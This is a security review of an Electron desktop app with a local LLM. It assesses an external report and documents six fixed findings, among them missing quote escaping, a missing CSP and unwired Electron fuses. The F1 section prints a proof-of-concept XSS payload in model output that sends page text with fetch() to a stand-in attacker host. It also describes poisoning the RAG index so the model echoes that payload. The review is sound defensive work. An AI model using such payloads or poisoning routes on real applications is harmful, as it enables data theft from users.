# Security review — Capsuleers.IA desktop app (2026-06-29)

**Scope:** `desktop/` (Electron app + IPC + renderer). Triggered by a third-party
"adversarial AI" report claiming *"unsanitized inputs and exfiltration / local code
execution from suitably corrupted prompts."*
**Method:** static read of the Electron config, the `preload` context bridge, the
clipboard ingestion path, the renderer rendering code, the LLM prompt/answer pipeline
(`engine.mjs` → `mdToHtml`), the IPC handlers, and the build config.
**Reviewer:** internal (Claude-assisted), William Peter Falci.

**Status:** all findings below are now **fixed** in the working tree (one with a documented
follow-up — see F4). Packaged builds should be smoke-tested before release.

---

## Verdict on the external claim

| Claim | Assessment |
|---|---|
| "Unsanitized inputs" | **Partially true.** One real sink: `esc()` did not encode quote characters, enabling an **attribute-breakout XSS** in the rendering of model answers (markdown links). Most other inputs were already well sanitized (see "Defences confirmed"). |
| "Exfiltration … from corrupted prompts" | **Conditionally true, now contained.** No active/hidden exfiltration exists in the code; egress is disclosed and consented. Exfiltration was only *possible* as a consequence of the XSS above **because there was no Content-Security-Policy**. A CSP now contains it. |
| "**Local code execution** (RCE) from corrupted prompts" | **Not reproducible / overstated.** No `exec`/`eval`/native sink is reachable from the renderer or from model output. Electron's `sandbox` + `contextIsolation` + a narrow context-bridge confine any renderer compromise to the Chromium sandbox. The only "execution" achievable is JS **inside the sandboxed renderer** via the XSS — not local/native code. (The one item touching real local-code-execution — packaged-binary fuses — was a hardening gap, now closed; see F4.) |

**Bottom line:** the report identified a genuine class of issue (output-rendering XSS +
no CSP), but the dramatic "local code execution" framing is not supported by the code. All
findings are now remediated.

---

## Findings

| ID | Title | Severity | Status |
|----|-------|----------|--------|
| F1 | Attribute-breakout XSS in model-answer rendering (`esc()` + link regex) | **Medium** | ✅ Fixed |
| F2 | No Content-Security-Policy → unconstrained exfiltration if XSS occurs | **Medium** | ✅ Fixed |
| F3 | `esc()` unsafe in attribute contexts generally (latent) | Low | ✅ Fixed (same change) |
| F4 | Electron fuses declared but not wired into the build (`RunAsNode` etc. at default) | Low–Medium | ✅ Fixed¹ |
| F5 | `data:wipe-all` (destructive) bridged with no main-side confirmation | Low | ✅ Fixed |
| F6 | `setModel(file)` lacks the basename guard `deleteModelFile` has | Low/Info | ✅ Fixed |

¹ Fuses are now wired via electron-builder's `electronFuses`; `enableEmbeddedAsarIntegrityValidation`
is intentionally left OFF until a packaged Windows build is smoke-tested with it on (see F4).

---

### F1 — Attribute-breakout XSS in model-answer rendering — **Medium** — ✅ Fixed

**Where:** `desktop/src/renderer/index.html` — `esc()` and `inline()` inside `mdToHtml`.

**Root cause:** `esc()` encoded `&`, `<`, `>` but **not** `"`/`'`. The model answer is
rendered with `body.innerHTML = mdToHtml(res.answer)`. `mdToHtml` correctly `esc()`s the
whole answer first (so `<script>`/`<img onerror>` injection is impossible), but the
markdown-link transform builds a **double-quoted attribute**:

```js
.replace(/\[([^\]]+)\]\((https?:\/\/[^)\s]+)\)/g, '<a href="$2">$1</a>')
```

The URL character class `[^)\s]+` accepted a literal `"`, and `esc()` left it raw.

**Proof of concept (model output):**

```
[click](https://x" onmouseover="fetch('https://attacker/x?c='+document.body.innerText))
```

→ rendered as `<a href="https://x" onmouseover="fetch(...)">click</a>` — an injected
event handler that runs (on hover) **inside the renderer**, with access to
`window.capsuleers.*` (the preload bridge) and, pre-fix, `fetch()` to any host.

**Realistic trigger path (in scope per `SECURITY.md`):** RAG **index/source poisoning**
— a crafted URL in an indexed wiki/source page that the local model echoes into its
answer. (A hostile string the *user* pastes to attack themselves is self-XSS, which
`SECURITY.md` lists as out of scope.)

**Severity rationale:** renderer is sandboxed + context-isolated, so this is **not**
RCE; it is interaction-gated (hover) and confined to the bridge API + (pre-fix) network.

**Fix applied:**
- `esc()` now also encodes `"` → `&quot;` and `'` → `&#39;`, making it safe in both
  element-content and attribute contexts. Because `mdToHtml` `esc()`s before building the
  link, no raw `"` can reach the `href` attribute anymore.
- Defence in depth: the URL char classes in `inline()` now exclude `"`
  (`[^)\s"]`, `[^\s<"]`).

---

### F2 — No Content-Security-Policy → unconstrained exfiltration — **Medium** — ✅ Fixed

**Where:** `desktop/src/renderer/index.html` (`<head>`).

**Root cause:** the renderer document shipped with no CSP. Any XSS (e.g. F1) therefore had
**unrestricted `connect-src`** — it could `fetch('https://attacker/…', {body: stolen})`
and exfiltrate the DOM/clipboard, or beacon via `<img src="https://attacker/?c=…">`.

**Fix applied:** a strict `<meta http-equiv="Content-Security-Policy">` was added:

```
default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline';
img-src 'self' https://images.evetech.net data:; connect-src 'self'; font-src 'self';
object-src 'none'; base-uri 'none'; form-action 'none'; frame-src 'none'
```

**Design notes:**
- The renderer makes **no** direct network requests (all egress is via IPC → main), so
  `connect-src 'self'` breaks nothing yet **fully contains exfiltration** from injected JS.
- `img-src` is pinned to the only image CDN actually loaded (`images.evetech.net`); the
  other hosts referenced in the renderer (`eve-kill.com`, `capsuleers.app`,
  `eveworkbench.com`) are anchor `href`s opened in the system browser, not page resources.
- `'unsafe-inline'` for `script`/`style` is required by the app's own inline `<script>` and
  inline styles. It does **not** weaken the exfil containment (that is `connect-src` +
  `img-src`), and the XSS sink itself is already closed by F1.

---

### F3 — `esc()` unsafe in attribute contexts generally — Low — ✅ Fixed

`esc()` is used inside many `title="${esc(...)}"` attributes across the renderer (kill
cards, pilot rows, ship strips, D-Scan). With EVE-charset names (no `"`) this was not
practically exploitable, but it shared F1's root cause. The same `esc()` change closes it.

---

### F4 — Electron fuses not wired into the build — Low–Medium — ✅ Fixed¹

**Was:** `@electron/fuses` was a `devDependency` with **no** `flipFuses`/`afterPack` or
config to flip them, so packaged binaries kept default fuses (notably `RunAsNode` enabled —
consistent with needing `unset ELECTRON_RUN_AS_NODE` to launch). Not prompt/remote-triggerable,
but the only item touching real "local code execution" (a local attacker setting env +
relaunching the binary as a generic Node process).

**Fix applied:** an `electronFuses` block in `electron-builder.yml` (electron-builder 26
flips fuses at pack time and re-signs as needed; the per-GPU variant configs inherit it via
`extends`):

```yaml
electronFuses:
  runAsNode: false
  enableCookieEncryption: true
  enableNodeOptionsEnvironmentVariable: false
  enableNodeCliInspectArguments: false
  enableEmbeddedAsarIntegrityValidation: false
  onlyLoadAppFromAsar: true
```

**¹ Follow-up (documented, intentional):** `enableEmbeddedAsarIntegrityValidation` is left
`false` because a header mismatch can **block app launch on Windows** and I could not test a
packaged build here (it is a no-op on the Linux AppImage). **Action:** flip it to `true`,
build the Windows NSIS installer, install and launch it once; if it starts cleanly, keep it on.

---

### F5 — `data:wipe-all` bridged without main-side confirmation — Low — ✅ Fixed

**Was:** `preload.cjs` exposes `data.wipeAll()` → `ipcMain.handle("data:wipe-all", …)` which
deletes all downloaded models + RAG index + caches and quits. The only confirmation was in
the renderer UI, so an XSS (F1) could call it directly and destroy ~1 GB+ of user data.

**Fix applied:** the handler now shows a main-process `dialog.showMessageBox` (warning,
Cancel default) and aborts unless the user confirms. New i18n keys `wipeTitle/wipeMsg/
wipeDetail/wipeConfirm` (it + en) back the dialog. A compromised renderer can no longer wipe
data silently.

---

### F6 — `setModel(file)` lacks basename guard — Low/Info — ✅ Fixed

**Was:** `deleteModelFile` rejected path traversal (`^[^/\\]+\.gguf$`), but `setModel` did
`path.join(MODELS_DIR, file)` without it (`file` arrives from the renderer bridge via
`models:set`). Impact was low (an arbitrary path is only *attempted* as a GGUF load), but
asymmetric.

**Fix applied:** `setModel` now rejects any non-basename / non-`.gguf` value up front with
the same guard, throwing a clear error (the `models:set` handler already wraps it in
try/catch).

---

## Defences confirmed (already correct — do not regress)

- **Electron 42 secure defaults**, now also **set explicitly** in `webPreferences`
  (`sandbox: true`, `contextIsolation: true`, `nodeIntegration: false`) so a future Electron
  default change can't silently weaken the renderer. No `<webview>`, no `enableRemoteModule`.
  This is why renderer XSS ≠ native RCE.
- **Narrow context bridge** (`preload.cjs`): fixed-channel methods only; no generic
  `ipcRenderer.invoke(channel)`, no `fs`/`shell`/`child_process` exposed.
- **Clipboard read via `execFileSync("wl-paste", ["-n"])`** — argument array, no shell →
  clipboard content cannot cause command injection.
- **Local-roster names sanitized at the source** (`clipboard-watch.mjs` `NAME_RE`): only
  letters/digits/space/apostrophe/dot/hyphen; lines with `<>{}[]|=;:/@` are discarded.
- **Model output fully `esc()`'d before markdown** in `mdToHtml` (no tag injection from the
  model; F1 was specifically the *attribute*-quote gap, now closed).
- **D-Scan render fully `esc()`'d**; ship names are SDE-resolved; image `src` uses numeric
  `typeId`.
- **Navigation locked down**: `setWindowOpenHandler → deny`, `will-navigate` prevented,
  only `^https?://` handed to the system browser.
- **`deleteModelFile` path-traversal guard** present.
- **LLM is 100% local** — `ask()` performs no network I/O. The only egress is disclosed and
  consented (eve-kill/ESI for intel; capsuleers.app only on an explicit Share click). No
  telemetry.

---

## Change log (this review)

- `desktop/src/renderer/index.html` — hardened `esc()` (encode `"`/`'`); excluded `"` from
  the two URL char classes in `inline()`; added a strict CSP `<meta>` in `<head>`. (F1–F3)
- `desktop/electron-builder.yml` — added the `electronFuses` hardening block (inherited by
  the variant configs via `extends`). (F4)
- `desktop/src/main.mjs` — explicit `sandbox/contextIsolation/nodeIntegration` in
  `webPreferences`; main-process confirmation dialog on `data:wipe-all` + four new i18n keys
  (it/en). (F4, F5)
- `desktop/src/engine.mjs` — basename guard on `setModel`. (F6)

## Remaining / recommended

1. **F4 follow-up** — set `enableEmbeddedAsarIntegrityValidation: true` and verify a packaged
   Windows install launches before relying on it.
2. **Optional** — externalize the inline `<script>`/`<style>` into `renderer.js`/`renderer.css`
   so `script-src` can drop `'unsafe-inline'` and block inline event handlers outright (a
   complete CSP-level defence against any future F1-class bug).
3. **Smoke-test** — launch the app, paste an EFT fit and a Local/D-Scan, confirm answers,
   killmail cards, portraits (evetech images), external links and the wipe-all dialog all
   work under the new CSP + fuses.
